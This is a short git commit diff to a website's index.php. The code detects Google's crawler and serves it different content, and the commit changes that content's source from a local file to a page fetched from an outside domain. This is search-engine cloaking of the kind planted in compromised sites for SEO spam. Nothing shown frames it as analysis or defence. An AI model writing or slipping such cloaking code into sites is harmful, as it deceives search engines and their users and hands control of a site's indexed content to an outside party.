6a09145ac55fed6fb9c46fbe9b79c05902a5156b
izuna <stokgsccml@gmail.com>
2025-03-09 15:05:19 +0700

    Update index.php

--- index.php
+++ index.php
@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('kiw.php');
+ $bot_content = file_get_contents('https://www.elitewikipublishers.com/kiw');
  echo $bot_content;
  exit;
 } else {
